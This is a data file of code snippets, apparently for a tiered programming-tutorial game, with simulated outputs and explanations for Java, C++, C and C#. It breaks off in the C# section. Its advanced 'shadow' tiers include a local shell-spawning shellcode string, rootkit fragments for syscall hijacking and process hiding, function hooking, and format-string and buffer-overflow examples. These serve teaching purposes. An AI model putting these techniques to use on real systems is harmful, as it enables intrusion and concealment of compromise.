                { ghost: `for (int i=0; i<5; i++) { }`, output: "Loop executed 5 times", explanation: "The for loop allows you to repeat a block of code a known number of times." },
                { ghost: `String s = "Shadow";`, output: "String created: Shadow", explanation: "Strings are objects in Java that represent sequences of characters." },
                { ghost: `int[] arr = {1, 2};`, output: "Array initialized: [1, 2]", explanation: "Arrays are fixed-size containers that hold multiple values of the same type." },
                { ghost: `public void test() { System.out.println("Running test"); }`, output: "Method defined", explanation: "Methods are blocks of code that run when called. 'public' means it's accessible from other classes." },
                { ghost: `class A { int x = 10; }`, output: "Class A defined", explanation: "Classes are blueprints for creating objects. Everything in Java is associated with classes and objects." },
                { ghost: `import java.util.*;`, output: "Imported java.util.*", explanation: "The import statement brings other classes or entire packages (libraries) into your code." },
                { 
                    ghost: `Scanner s = new Scanner(System.in);\nString input = s.nextLine();`, 
                    output: "Input received", 
                    explanation: "Scanner is a common class used to get user input from the console (System.in). nextLine() reads a full line of text.",
                    input: {
                        prompts: ["Enter text: "],
                        handler: (args) => `Input: ${args[0]}`
                    }
                }
            ],
            intermediate: [
                { ghost: `for(int i=0; i<5; i++) { for(int j=0; j<=i; j++) System.out.print("* "); System.out.println(); }`, output: "*\n* *\n* * *\n* * * *\n* * * * *", explanation: "Nested loops can generate patterns like a pyramid." },
                { ghost: `ArrayList<String> l = new ArrayList<>();\nl.add("Item");`, output: "List size: 1, Content: [Item]", explanation: "The ArrayList class is a resizable array, which can be found in the java.util package. It handles dynamic resizing automatically." },
                { ghost: `HashMap<String, Integer> m = new HashMap<>();\nm.put("Key", 1);`, output: "Map entry: Key=1", explanation: "HashMap stores items in 'key/value' pairs, and you can access them by an index of another type (e.g. a String)." },
                { ghost: `try {\n  int d = 1 / 0;\n} catch (ArithmeticException e) {\n  System.out.println("Error");\n}`, output: "Error", explanation: "The try statement allows you to define a block of code to be tested for errors. The catch block executes if an error occurs." },
                { ghost: `interface Animal {\n  void animalSound();\n}`, output: "Interface Animal defined", explanation: "An interface is a completely 'abstract class' that is used to group related methods with empty bodies." },
                { ghost: `abstract class Shape {\n  abstract void draw();\n}`, output: "Abstract Class Shape defined", explanation: "Abstract classes cannot be instantiated, but they can be subclassed. They serve as a template for other classes." },
                { ghost: `class Dog extends Animal {\n  void bark() { System.out.println("Woof"); }\n}`, output: "Class Dog defined", explanation: "Inheritance can be defined as the process where one class acquires the properties (methods and fields) of another." },
                { ghost: `super.display();`, output: "Super method called", explanation: "The super keyword refers to superclass (parent) objects. It is used to call superclass methods, and to access the superclass constructor." },
                { ghost: `this.x = x;`, output: "Field x updated", explanation: "The this keyword refers to the current object in a method or constructor. It eliminates confusion between class attributes and parameters." },
                { ghost: `static int count = 0;`, output: "Static variable initialized", explanation: "Static members belong to the class rather than a specific instance. They can be accessed without creating an object of the class." },
                { ghost: `final int MAX = 100;`, output: "Constant MAX defined", explanation: "The final keyword is a non-access modifier used for classes, attributes and methods, which makes them unchangeable." }
            ],
            master: [
                { ghost: `ArrayList<String> l = new ArrayList<>();\nl.remove(0);`, output: "Element removed", explanation: "Advanced ArrayList operations include removing elements by index or object, checking for existence, and bulk operations." },
                { ghost: `LinkedList<String> l = new LinkedList<>();\nl.addFirst("A");`, output: "Element added to head", explanation: "LinkedList implements the List interface using a doubly-linked list structure. It is faster for manipulation but slower for access." },
                { ghost: `Stack<Integer> s = new Stack<>();\ns.push(10);`, output: "Element pushed", explanation: "The Stack class represents a last-in-first-out (LIFO) stack of objects. It extends vector with five operations." },
                { ghost: `Queue<Integer> q = new LinkedList<>();\nq.offer(1);`, output: "Element offered", explanation: "The Queue interface is used to hold elements prior to processing in a First-In-First-Out (FIFO) order." },
                { ghost: `HashSet<String> s = new HashSet<>();\ns.add("A");`, output: "Element added", explanation: "A HashSet is a collection of items where every item is unique, and it is found in the java.util package." },
                { ghost: `HashMap<String, Integer> m = new HashMap<>();\nm.containsKey("A");`, output: "Key found: true", explanation: "HashMap allows storing key-value pairs. It uses a hash table for storage, providing constant-time performance for basic operations." },
                { ghost: `Stream.of(1,2).map(x->x*2).forEach(System.out::print);`, output: "24", explanation: "Streams allow functional-style operations on streams of elements, such as map-reduce transformations on collections." },
                { ghost: `Optional<String> o = Optional.of("A");\no.ifPresent(System.out::print);`, output: "A", explanation: "Optional is a container object which may or may not contain a non-null value. It avoids null checks and NullPointerExceptions." },
                { ghost: `Thread t = new Thread(() -> System.out.println("Running"));\nt.start();`, output: "Running", explanation: "Threads allow a program to operate more efficiently by doing multiple things at the same time." },
                { ghost: `synchronized(this) {\n  // Critical section\n}`, output: "Block synchronized", explanation: "Synchronization controls the access of multiple threads to any shared resource, preventing thread interference and consistency errors." }
            ],
            legend: [
                { ghost: `Collections.sort(list);\n// List is now sorted`, output: "List sorted", explanation: "The Collections.sort() method sorts the elements of a list in ascending order. It uses a modified mergesort or Timsort." },
                { ghost: `int index = Collections.binarySearch(list, key);`, output: "Index found: 2", explanation: "Binary search is an efficient algorithm for finding an item from a sorted list of items. It works by repeatedly dividing the portion of the list in half." },
                { ghost: `PriorityQueue<Integer> pq = new PriorityQueue<>();\npq.add(10);`, output: "Element added with priority", explanation: "A PriorityQueue is used when the objects are supposed to be processed based on their priority. It is based on the priority heap." },
                { ghost: `TreeMap<String, Integer> tm = new TreeMap<>();\ntm.put("Key", 1);`, output: "Entry added", explanation: "A TreeMap contains values based on the key. It is sorted according to the natural ordering of its keys." },
                { ghost: `Proxy.newProxyInstance(\n  loader, interfaces, handler\n);`, output: "Proxy instance created", explanation: "Java Dynamic Proxy mechanism allows creating a proxy instance for an interface at runtime, redirecting method calls to an invocation handler." },
                { ghost: `Method m = c.getMethod("methodName");\nm.invoke(obj);`, output: "Method invoked", explanation: "Reflection is an API which is used to examine or modify the behavior of methods, classes, and interfaces at runtime." },
                { ghost: `Annotation[] a = c.getAnnotations();`, output: "Annotations retrieved", explanation: "Annotations provide data about a program that is not part of the program itself. They have no direct effect on the operation of the code they annotate." },
                { ghost: `CompletableFuture.supplyAsync(() -> "Hello")\n  .thenAccept(System.out::println);`, output: "Hello", explanation: "CompletableFuture is used for asynchronous programming. It allows you to write non-blocking code by running a task on a separate thread." },
                { ghost: `System.gc();`, output: "Garbage collection requested", explanation: "System.gc() is used to invoke the garbage collector to perform cleanup processing. It suggests that the JVM expend effort toward recycling unused objects." }
            ],
            shadow: [
                { ghost: `ClassWriter cw = new ClassWriter(0);\ncw.visit(V1_8, ACC_PUBLIC, "Example", null, "java/lang/Object", null);`, output: "Class visited", explanation: "ASM is an all-purpose Java bytecode manipulation framework. It can be used to modify existing classes or dynamically generate classes." },
                { ghost: `// JVMTI Agent C++ Code
JNIEXPORT jint JNICALL Agent_OnLoad(JavaVM *vm, char *options, void *reserved) {
    jvmtiEnv *jvmti;
    vm->GetEnv((void **)&jvmti, JVMTI_VERSION_1_0);
    return JNI_OK;
}`, output: "Agent loaded", explanation: "JVM Tool Interface (JVMTI) is a native interface allowing advanced debugging, profiling, and monitoring by hooking into JVM events." },
                { ghost: `public native void nativeMethod();\nSystem.loadLibrary("lib");`, output: "Native library loaded", explanation: "Java Native Interface (JNI) enables Java code to call and be called by native applications and libraries written in other languages like C/C++." },
                { ghost: `public static void premain(String args, Instrumentation inst) {
    inst.addTransformer(new ClassFileTransformer() {
        public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) { return null; }
    });
}`, output: "Agent premain executed", explanation: "The Instrumentation API allows adding byte-code instrumentation to existing classes, enabling tools like APM agents." },
                { ghost: `ByteBuffer buffer = ByteBuffer.allocateDirect(1024);`, output: "Direct buffer allocated", explanation: "Off-heap memory allows your application to allocate memory outside the garbage-collected heap, which can help manage large datasets." },
                { ghost: `Signal.handle(new Signal("INT"), signal -> System.out.println("Interrupted"));`, output: "Signal handler registered", explanation: "Signal handling allows a program to handle asynchronous events (signals) delivered by the operating system." },
                { ghost: `System.setSecurityManager(new SecurityManager());`, output: "Security manager set", explanation: "The Security Manager allows applications to implement a security policy, defining what actions are unsafe or sensitive." },
                { ghost: `// Hotswap Agent Logic
File file = new File("MyClass.class");
byte[] bytes = Files.readAllBytes(file.toPath());
ClassDefinition def = new ClassDefinition(MyClass.class, bytes);
inst.redefineClasses(def);`, output: "HotSwap logic ready", explanation: "HotSwap (via Instrumentation.redefineClasses) allows updating the code of a running application without restarting it." },
                { ghost: `MappedByteBuffer mbb = fc.map(MapMode.READ_WRITE, 0, 1024);`, output: "File mapped to memory", explanation: "Memory-mapped files allow Java programs to access files on disk as if they were in memory, which can be much faster for large files." },
                { ghost: `Void v = null;`, output: "Void type reference", explanation: "The Void class is an uninstantiable placeholder class to hold a reference to the Class object representing the Java keyword void." }
            ]
        }
    },
    cpp: {
        name: "C++",
        tiers: {
            beginner: [
                { ghost: `#include <iostream>\nusing namespace std;\ncout << "Hello";`, output: "Hello", explanation: "We use 'using namespace std;' to avoid typing 'std::' everywhere. 'cout' prints to the console." },
                { ghost: `int x = 10;`, output: "Variable x: 10", explanation: "Variables in C++ must have a type. 'int' stores integer numbers." },
                { 
                    ghost: `int x;\ncin >> x;`, 
                    output: "Input received", 
                    explanation: "'cin' gets input from the keyboard. The >> operator directs input into the variable.",
                    input: {
                        prompts: ["Enter value for x: "],
                        handler: (args) => `x = ${args[0]}`
                    }
                },
                { ghost: `int x = 5;\nif (x > 0) { cout << "Positive"; }`, output: "Positive", explanation: "If statements allow conditional code execution based on a boolean expression." },
                { ghost: `for(int i=0; i<5; ++i) {}`, output: "Loop done", explanation: "For loops are used for iterating a specific number of times. It has initialization, condition, and increment parts." },
                { ghost: `vector<int> v;`, output: "Vector created", explanation: "Vectors are dynamic arrays that can grow in size. They are part of the Standard Template Library (STL)." },
                { ghost: `string s = "A";`, output: "String: A", explanation: "Strings provide a safe and convenient way to handle text compared to C-style arrays." },
                { ghost: `void func() { std::cout << "Hello"; }`, output: "Function defined", explanation: "Functions break code into reusable blocks. 'void' means this function returns no value." },
                { ghost: `struct Point { int x, y; };`, output: "Struct Point defined", explanation: "Structs group related variables together under a single name." },
                { ghost: `int x = 10;\nint* p = &x;`, output: "Pointer initialized", explanation: "Pointers store memory addresses. '&' gets the address of a variable, '*' defines a pointer." }
            ],
            intermediate: [
                { ghost: `for(int i=0; i<5; i++) { for(int j=0; j<=i; j++) cout << "* "; cout << endl; }`, output: "*\n* *\n* * *\n* * * *\n* * * * *", explanation: "Nested loops can generate patterns like a pyramid. The inner loop runs 'i' times for each row." },
                { ghost: `class Car {\npublic:\n  Car() { std::cout << "Vroom"; }\n};`, output: "Class Car defined", explanation: "Classes are the main building block of Object-Oriented Programming in C++. They bundle data and methods." },
                { ghost: `int* p = new int(10);`, output: "Memory allocated", explanation: "The 'new' operator allocates memory on the heap. This memory exists until explicitly freed." },
                { ghost: `int* p = new int(10);\ndelete p;`, output: "Memory freed", explanation: "The 'delete' operator frees memory allocated by 'new'. Failing to delete causes memory leaks." },
                { ghost: `virtual void draw() = 0;`, output: "Virtual function declared", explanation: "Virtual functions allow derived classes to override behavior. Pure virtual functions (= 0) make a class abstract." },
                { 
                    ghost: `template <typename T>\nT add(T a, T b) {\n  return a + b;\n}`, 
                    output: "Function defined", 
                    explanation: "Templates allow writing generic code that works with any data type, enabling powerful code reuse.",
                    input: {
                        prompts: ["Enter a: ", "Enter b: "],
                        handler: (args) => {
                            const res = parseFloat(args[0]) + parseFloat(args[1]);
                            return isNaN(res) ? "Result: " + args[0] + args[1] : res.toString();
                        }
                    }
                },
                { ghost: `map<string, int> m;\nm["one"] = 1;`, output: "Map entry added", explanation: "std::map is an associative container that stores elements in key-value pairs, sorted by key." },
                { ghost: `auto x = 5;\nauto y = 3.14;`, output: "Types deduced", explanation: "The 'auto' keyword (C++11) allows the compiler to deduce the type of a variable from its initializer." },
                { ghost: `int x = 10;\nint& ref = x;`, output: "Reference created", explanation: "A reference is an alias for an existing variable. Modifications to the reference affect the original variable." },
                { ghost: `namespace MySpace {\n  int x;\n}`, output: "Namespace defined", explanation: "Namespaces prevent name conflicts by grouping entities like classes and functions under a name." },
                { ghost: `try {\n  throw 20;\n} catch (int e) {\n  cout << "Error " << e;\n}`, output: "Error 20", explanation: "Exception handling provides a way to transfer control from one part of a program to another when an error occurs." }
            ],
            master: [
                { ghost: `forward_list<int> fl = {1, 2};`, output: "Forward list created", explanation: "A forward_list is a container that supports fast insertion and removal of elements from anywhere in the container." },
                { ghost: `list<int> dl = {1, 2};`, output: "Doubly linked list created", explanation: "std::list is a doubly linked list that supports constant time insertion and removal of elements from anywhere in the container." },
                { ghost: `struct Node {\n  int d;\n  Node *l, *r;\n};`, output: "Node struct defined", explanation: "A common way to represent trees or linked lists is using a struct with pointers to other instances of the struct." },
                { ghost: `unique_ptr<A> p = make_unique<A>();`, output: "Unique pointer created", explanation: "std::unique_ptr is a smart pointer that owns and manages another object through a pointer and disposes of that object when the unique_ptr goes out of scope." },
                { ghost: `shared_ptr<A> p = make_shared<A>();`, output: "Shared pointer created", explanation: "std::shared_ptr is a smart pointer that retains shared ownership of an object through a pointer." },
                { ghost: `auto f = [](int x) { return x+1; };`, output: "Lambda defined", explanation: "Lambdas are anonymous function objects that capture variables from their scope. They are powerful for callbacks." },
                { ghost: `thread t(func);`, output: "Thread created", explanation: "std::thread allows you to write concurrent programs. It represents a single thread of execution." },
                { ghost: `mutex m;\nm.lock();\n// critical\nm.unlock();`, output: "Mutex locked/unlocked", explanation: "A mutex (mutual exclusion) is a synchronization primitive that can be used to protect shared data from being simultaneously accessed by multiple threads." },
                { ghost: `stack<int> s;\ns.push(1);`, output: "Stack created", explanation: "std::stack is a container adaptor that gives the programmer the functionality of a stack - specifically, a LIFO (last-in, first-out) data structure." },
                { ghost: `queue<int> q;\nq.push(1);`, output: "Queue created", explanation: "std::queue is a container adaptor that gives the programmer the functionality of a queue - specifically, a FIFO (first-in, first-out) data structure." },
                { ghost: `priority_queue<int> pq;`, output: "Priority queue created", explanation: "std::priority_queue is a container adaptor that provides constant time lookup of the largest element." },
                { ghost: `set<int> s;\ns.insert(1);`, output: "Set created", explanation: "std::set is an associative container that contains a sorted set of unique objects of type Key." },
                { ghost: `unordered_map<int, int> m;`, output: "Unordered map created", explanation: "std::unordered_map is an associative container that stores elements formed by the combination of a key value and a mapped value, using a hash table." }
            ],
            legend: [
                { ghost: `sort(v.begin(), v.end());`, output: "Vector sorted", explanation: "std::sort sorts the elements in the range [first, last) into ascending order. It typically uses Introsort." },
                { ghost: `bool found = binary_search(v.begin(), v.end(), 5);`, output: "Search result: true", explanation: "std::binary_search tests if a value exists in a sorted range. It returns true if found, false otherwise." },
                { ghost: `auto it = lower_bound(v.begin(), v.end(), 5);`, output: "Iterator found", explanation: "std::lower_bound returns an iterator to the first element in the range that does not compare less than the value." },
                { ghost: `next_permutation(v.begin(), v.end());`, output: "Permutation generated", explanation: "std::next_permutation rearranges elements into the next lexicographically greater permutation." },
                { ghost: `make_heap(v.begin(), v.end());`, output: "Heap constructed", explanation: "std::make_heap constructs a heap in the range [first, last). Heaps allow fast retrieval of the largest element." },
                { ghost: `template <typename... Args>\nvoid f(Args... args) { ((std::cout << args << " "), ...); }`, output: "Template defined", explanation: "Variadic templates allow a template to accept an arbitrary number of template arguments." },
                { ghost: `template <typename T>\nenable_if_t<is_integral_v<T>> f(T t) {}`, output: "Template constrained", explanation: "SFINAE (Substitution Failure Is Not An Error) is a technique where an invalid template substitution does not cause a compilation error but is simply ignored." },
                { ghost: `decltype(x) y = x;`, output: "Type deduced", explanation: "The decltype specifier inspects the declared type of an entity or the type and value category of an expression." },
                { ghost: `tuple<int, float> t(1, 2.5f);`, output: "Tuple created", explanation: "std::tuple is a fixed-size collection of heterogeneous values. It is a generalization of std::pair." },
                { ghost: `co_await future;`, output: "Coroutine suspended", explanation: "Coroutines are functions that can suspend execution to be resumed later. C++20 introduces support for stackless coroutines." }
            ],
            shadow: [
                { ghost: `template<int N>\nstruct Factorial {\n  enum { value = N * Factorial<N - 1>::value };\n};`, output: "Compile-time calculation", explanation: "Template Metaprogramming is a technique where templates are used to perform computations at compile-time." },
                { ghost: `template <class T> class MallocAllocator {
    public:
    using value_type = T;
    T* allocate(size_t n) { return (T*)malloc(n * sizeof(T)); }
    void deallocate(T* p, size_t n) { free(p); }
};`, output: "Allocator defined", explanation: "Custom allocators allow you to control how memory is allocated for STL containers, optimizing for specific patterns." },
                { ghost: `std::atomic<int> head;
int expected = head.load();
while (!head.compare_exchange_weak(expected, new_val)) {
    // Loop until successful
}`, output: "Atomic operation", explanation: "Lock-free data structures use atomic Compare-And-Swap (CAS) loops to safely update shared state without mutexes." },
                { ghost: `__m128 a = _mm_set_ps(1, 2, 3, 4);`, output: "SIMD vector created", explanation: "SIMD (Single Instruction, Multiple Data) intrinsics allow you to use special CPU instructions to process multiple data points in parallel." },
                { ghost: `// Hooking MessageBoxA
void Hook() {
    VirtualProtect(addr, 5, PAGE_EXECUTE_READWRITE, &old);
    memcpy(original, addr, 5);
    *addr = 0xE9; // JMP
}`, output: "Hook installed", explanation: "Hooking involves intercepting function calls or messages between software components. It's often used for debugging or extending functionality." },
                { ghost: `extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    DriverObject->DriverUnload = UnloadDriver;
    return STATUS_SUCCESS;
}`, output: "Driver loaded", explanation: "Writing kernel drivers requires understanding the OS internals and interacting directly with hardware." },
                { ghost: `char buf[8];\nstrcpy(buf, "TooLongString");`, output: "Buffer overflow simulated", explanation: "Buffer overflows occur when a program writes data past the end of a buffer, potentially overwriting adjacent memory." },
                { ghost: `// ROP Gadget Chain
void rop_chain() {
    asm("pop %rdi; ret");
    asm("pop %rsi; ret");
}`, output: "Gadget found", explanation: "ROP (Return-Oriented Programming) chains small instruction sequences (gadgets) ending in 'ret' to execute arbitrary code." },
                { ghost: `int *p = nullptr;\n*p = 1;`, output: "UB triggered", explanation: "Undefined Behavior is behavior that the language standard does not define. It can lead to unpredictable results and security vulnerabilities." },
                { ghost: `void *ptr = &x;`, output: "Void pointer created", explanation: "A void pointer is a pointer that has no associated data type. It can hold the address of any type of object." }
            ]
        }
    },
    c: {
        name: "C",
        tiers: {
            beginner: [
                { ghost: `printf("Hello");`, output: "Hello", explanation: "printf is the standard function for printing formatted output to the console." },
                { 
                    ghost: `int x; scanf("%d", &x);`, 
                    output: "Input received", 
                    explanation: "scanf reads formatted input from stdin. '&x' passes the memory address of x so scanf can modify it.",
                    input: {
                        prompts: ["Enter integer: "],
                        handler: (args) => `Value read: ${args[0]}`
                    }
                },
                { ghost: `int x = 1;\nif (x) {}`, output: "Condition checked", explanation: "In C, any non-zero value is considered true. This checks if x is not zero." },
                { ghost: `while(1) {}`, output: "Infinite loop start", explanation: "while(1) creates an infinite loop because 1 is always true." },
                { ghost: `int arr[5];`, output: "Array created", explanation: "Arrays are fixed-size collections of elements of the same type stored in contiguous memory." },
                { ghost: `char s[] = "Str";`, output: "String created", explanation: "Strings in C are just arrays of characters terminated by a null character." },
                { ghost: `void f() { printf("Called"); }`, output: "Function defined", explanation: "Functions are blocks of code. 'void' indicates the function does not return a value." },
                { ghost: `struct S { int x; };`, output: "Struct defined", explanation: "Structs are user-defined data types that group related variables." },
                { ghost: `enum E { A, B };`, output: "Enum defined", explanation: "Enums define a type consisting of a set of named integer constants." },
                { ghost: `// Comment`, output: "Comment ignored", explanation: "Comments are ignored by the compiler and are used to explain code to humans." }
            ],
            intermediate: [
                { ghost: `for(int i=0; i<5; i++) { for(int j=0; j<=i; j++) printf("* "); printf("\\n"); }`, output: "*\n* *\n* * *\n* * * *\n* * * * *", explanation: "Nested loops can generate patterns like a pyramid." },
                { ghost: `int x = 10;\nint *p = &x;`, output: "Pointer initialized", explanation: "A pointer is a variable that stores the memory address of another variable." },
                { ghost: `int *p = malloc(sizeof(int));`, output: "Memory allocated", explanation: "malloc() allocates a block of memory of the specified size and returns a pointer to the beginning of the block." },
                { ghost: `int *p = malloc(sizeof(int));\nfree(p);`, output: "Memory freed", explanation: "free() deallocates the memory previously allocated by malloc(), calloc(), or realloc()." },
                { ghost: `typedef struct S MyStruct;`, output: "Type defined", explanation: "The typedef keyword is used to give a new name to an existing type." },
                { ghost: `union Data {\n  int i;\n  float f;\n};`, output: "Union defined", explanation: "A union is a user-defined type similar to a struct, but all members share the same memory location." },
                { ghost: `void my_func(int x) { printf("%d", x); }\nvoid (*func_ptr)(int) = &my_func;`, output: "Function pointer assigned", explanation: "Function pointers store the address of a function, allowing you to pass functions as arguments." },
                { ghost: `const int MAX = 100;`, output: "Constant defined", explanation: "The const keyword declares a variable whose value cannot be changed." },
                { ghost: `static int count = 0;`, output: "Static variable defined", explanation: "The static keyword has different meanings depending on context: preserving value in functions or limiting scope to the file." },
                { ghost: `extern int shared_var;`, output: "Extern declaration", explanation: "The extern keyword declares a variable or function that is defined in another file or module." },
                { ghost: `#define PI 3.14159`, output: "Macro defined", explanation: "Macros are fragments of code that are given a name. They are expanded by the preprocessor before compilation." }
            ],
            master: [
                { ghost: `struct Node {\n  int d;\n  struct Node *next;\n};`, output: "Singly linked node", explanation: "A singly linked list node contains data and a pointer to the next node." },
                { ghost: `struct DNode {\n  int d;\n  struct DNode *prev, *next;\n};`, output: "Doubly linked node", explanation: "A doubly linked list node contains data and pointers to both the previous and next nodes." },
                { ghost: `struct Tree {\n  int d;\n  struct Tree *l, *r;\n};`, output: "Tree node", explanation: "A binary tree node contains data and pointers to the left and right children." },
                { ghost: `char src[]="A", dest[2];\nmemcpy(dest, src, 2);`, output: "Memory copied", explanation: "memcpy copies n bytes from memory area src to memory area dest. The areas must not overlap." },
                { ghost: `char ptr[10];\nmemset(ptr, 0, 10);`, output: "Memory set", explanation: "memset fills the first n bytes of the memory area pointed to by s with the constant byte c." },
                { ghost: `volatile int status;`, output: "Volatile variable", explanation: "The volatile keyword indicates that a value may change between accesses, even if it doesn't appear to be modified." },
                { ghost: `register int counter;`, output: "Register variable", explanation: "The register keyword suggests that the variable be stored in a CPU register for faster access (mostly deprecated/ignored now)." },
                { ghost: `int error = 1;\nif (error) goto cleanup;\ncleanup:;`, output: "Jumped to label", explanation: "The goto statement transfers control to the labeled statement. Use with caution to avoid spaghetti code." },
                { ghost: `FILE *f = fopen("data.txt", "r");`, output: "File opened", explanation: "fopen opens the file whose name is the string pointed to by filename and associates a stream with it." },
                { ghost: `struct Flags {\n  unsigned int is_ready : 1;\n};`, output: "Bit field defined", explanation: "Bit fields allow the packing of data structures by specifying the number of bits for struct members." },
                { ghost: `float f = (float)int_val;`, output: "Type casted", explanation: "Type casting allows you to convert a variable from one type to another." },
                { ghost: `int main(int argc, char **argv) { printf("Count: %d", argc); return 0; }`, output: "Main function", explanation: "Command line arguments allow you to pass information to the program at startup via argc (count) and argv (values)." },
                { ghost: `struct __attribute__((packed)) P { int id; char c; };`, output: "Attribute applied", explanation: "Attributes allow you to specify special properties for variables, functions, or types, like packing structs." }
            ],
            legend: [
                { ghost: `jmp_buf env;\nif(!setjmp(env)) longjmp(env, 1);`, output: "Jump point set", explanation: "setjmp saves the stack context/environment in env for later use by longjmp, effectively allowing non-local jumps." },
                { ghost: `signal(SIGINT, handler_func);`, output: "Signal handler set", explanation: "signal() sets a function to handle signal i.e. a signal handler with signal number." },
                { ghost: `pid_t pid = fork();`, output: "Process forked", explanation: "fork() creates a new process by duplicating the calling process. The new process is referred to as the child process." },
                { ghost: `execl("/bin/ls", "ls", NULL);`, output: "Process replaced", explanation: "The exec() family of functions replaces the current process image with a new process image." },
                { ghost: `pthread_t t;\npthread_create(&t, NULL, func, NULL);`, output: "Thread created", explanation: "pthread_create starts a new thread in the calling process. The new thread starts execution by invoking start_routine." },
                { ghost: `void *p = mmap(0, size, PROT_READ, MAP_PRIVATE, fd, 0);`, output: "Memory mapped", explanation: "mmap() creates a new mapping in the virtual address space of the calling process." },
                { ghost: `asm("movl %eax, %ebx");`, output: "Assembly executed", explanation: "Inline assembly allows you to embed assembly language instructions directly into your C code." },
                { ghost: `vsnprintf(buf, size, fmt, args);`, output: "Formatted string", explanation: "vsnprintf writes formatted output to a character array, using a variable argument list." },
                { ghost: `void *p = alloca(1024);`, output: "Stack memory allocated", explanation: "alloca() allocates memory in the stack frame of the caller. This memory is automatically freed when the function returns." },
                { ghost: `void *handle = dlopen("lib.so", RTLD_LAZY);
void (*func)() = dlsym(handle, "func");
func();
dlclose(handle);`, output: "Library loaded", explanation: "dlopen() loads the dynamic shared object (shared library) file named by the null-terminated string filename." }
            ],
            shadow: [
                { ghost: `char buf[8];
strcpy(buf, "TooLongString"); // Overflow!`, output: "Segfault", explanation: "A buffer overflow occurs when data is written past the end of a buffer, potentially overwriting adjacent memory and leading to arbitrary code execution." },
                { ghost: `printf(user_input); // Vulnerable!
// User input: %x %x %x`, output: "Memory leaked", explanation: "Format string vulnerabilities occur when user input is used as the format string in functions like printf, allowing attackers to read or write memory." },
                { ghost: `char shellcode[] = "\\x31\\xc0\\x50\\x68//sh\\x68/bin\\x89\\xe3\\x50\\x53\\x89\\xe1\\x99\\xb0\\x0b\\xcd\\x80";
void (*f)() = (void(*)())shellcode;
f();`, output: "Shell spawned", explanation: "Shellcode is a small piece of code used as the payload in the exploitation of a software vulnerability." },
                { ghost: `module_init(my_init);
module_exit(my_exit);
// sys_call_table[__NR_read] = hacked_read;`, output: "Rootkit loaded", explanation: "Kernel modules are pieces of code that can be loaded and unloaded into the kernel upon demand, extending the kernel's functionality." },
                { ghost: `struct task_struct *task = current;
list_del(&task->tasks); // Hide from process list`, output: "Process hidden", explanation: "A rootkit is a collection of computer software, typically malicious, designed to enable access to a computer or an area of its software that is not otherwise allowed." },
                { ghost: `int main() {
    char*s="char*s=%c%s%c;main(){printf(s,34,s,34);}";
    printf(s,34,s,34);
}`, output: "Quine", explanation: "Obfuscated C code is intentionally written to be difficult for humans to understand, often for competitions like IOCCC." },
                { ghost: `switch(n % 8) {
    case 0: do { *to = *from++;
    case 7:      *to = *from++;
    case 6:      *to = *from++;
    case 5:      *to = *from++;
    case 4:      *to = *from++;
    case 3:      *to = *from++;
    case 2:      *to = *from++;
    case 1:      *to = *from++;
    // ...
    } while(--n > 0);
}`, output: "Unrolled", explanation: "Duff's device is a manually unrolled loop in C that uses the fall-through property of switch statements to interlace a while loop." },
                { ghost: `int *p = (int*)((char*)base + offset);`, output: "Pointer calc", explanation: "Pointer arithmetic allows navigating memory by adding or subtracting values from pointers, often used in low-level systems programming." },
                { ghost: `socket(AF_INET, SOCK_RAW, IPPROTO_TCP);`, output: "Raw socket", explanation: "Raw sockets allow sending and receiving packets without the operating system's protocol stack processing, used for custom protocols." },
                { ghost: `void func(void);`, output: "Void func", explanation: "The void type specifies that no value is available. It is used for functions that do not return a value or function parameters." }
            ]
        }
    },
    csharp: {
        name: "C#",
        tiers: {
            beginner: [
                { ghost: `Console.WriteLine("Hi");`, output: "Hi", explanation: "Console.WriteLine prints text to the console followed by a line terminator." },
                { ghost: `int x = 10;`, output: "10", explanation: "Variables are strongly typed. 'int' is the standard type for integers." },
                { ghost: `if (true) {}`, output: "True", explanation: "The if statement allows you to run code based on a boolean condition." },
                { ghost: `for (;;) {}`, output: "Infinite Loop", explanation: "This is an infinite for loop. It's valid syntax where all three loop expressions are empty." },
                { 
                    ghost: `string name = Console.ReadLine();\nConsole.WriteLine("Hello " + name);`, 
                    output: "Input processed", 
                    explanation: "Console.ReadLine reads input from the user. Concatenation joins strings together.",
                    input: {
                        prompts: ["Enter your name: "],
                        handler: (args) => `Hello ${args[0]}`
                    }
                },
                { ghost: `var x = 1;`, output: "1", explanation: "The 'var' keyword tells the compiler to infer the variable's type from the assigned value." },
                { ghost: `class P { public int Id { get; set; } }`, output: "Class defined", explanation: "Classes are the building blocks of C# applications, encapsulating data and behavior." },
                { ghost: `void M() { Console.WriteLine("Method M"); }`, output: "Method defined", explanation: "Methods define behavior. 'void' means the method doesn't return any value." },
                { ghost: `int[] a = {1};`, output: "Array created", explanation: "Arrays are fixed-size collections. This syntax initializes an array with values." },
                { ghost: `using System;\nConsole.WriteLine("Ready");`, output: "Imported", explanation: "The using directive allows you to use types defined in a namespace (like System) without specifying the full namespace." }
            ],
            intermediate: [
                { ghost: `for(int i=0; i<5; i++) { for(int j=0; j<=i; j++) Console.Write("* "); Console.WriteLine(); }`, output: "*\n* *\n* * *\n* * * *\n* * * * *", explanation: "Nested loops can generate patterns like a pyramid." },
                { ghost: `List<int> l = new List<int>();`, output: "List created", explanation: "Generics allow you to define classes, interfaces, and methods with placeholders for the type of data they store or use." },
                { ghost: `public int MyProp { get; set; }`, output: "Property", explanation: "Properties provide a flexible mechanism to read, write, or compute the value of a private field." },
                { ghost: `try {\n  throw new Exception();\n} catch (Exception e) {\n  Console.WriteLine(e.Message);\n}`, output: "Error caught", explanation: "Exception handling uses try, catch, and finally blocks to manage runtime errors and maintain application flow." },
                { ghost: `interface ILogger {\n  void Log(string message);\n}`, output: "Interface defined", explanation: "An interface defines a contract. Any class or struct that implements that contract must provide an implementation of the members defined in the interface." },
                { ghost: `enum Days { Sun, Mon, Tue }`, output: "Enum defined", explanation: "An enum is a distinct type that consists of a set of named constants called the enumerator list." },
                { ghost: `struct Point {\n  public int X, Y;\n}`, output: "Struct defined", explanation: "A struct is a value type that is typically used to encapsulate small groups of related variables." },
                { ghost: `delegate void MyDelegate(string msg);`, output: "Delegate defined", explanation: "A delegate is a type that represents references to methods with a particular parameter list and return type." },
                { ghost: `public event EventHandler MyEvent;`, output: "Event defined", explanation: "Events enable a class or object to notify other classes or objects when something of interest occurs." },
